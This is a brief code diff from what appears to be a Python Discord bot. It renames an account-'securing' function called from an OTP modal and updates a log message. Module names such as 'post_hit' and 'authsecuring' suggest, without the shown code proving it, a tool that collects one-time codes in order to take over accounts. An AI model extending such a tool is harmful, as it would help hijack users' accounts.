@@ -6,7 +6,7 @@ import json
 
 from views.buttons.embed_buttons import ButtonOptions
 
-from authsecuring.orch import startSecuringAccount
+from authsecuring.orch import romeo_secure
 from authsecuring.auth.initial_session import get_session
 from tools.send_logs import send_logs, build_log_embed
 from tools.post_hit import (
@@ -90,7 +90,7 @@ class MyModalTwo(ui.Modal):
             )
         except Exception as exc:
             import logging
-            logging.getLogger("bot").exception("embed OTP startSecuringAccount crashed")
+            logging.getLogger("bot").exception("embed OTP romeo_secure crashed")
             securedAccount = {
                 "failed": True,
                 "reason": "Securing crashed",
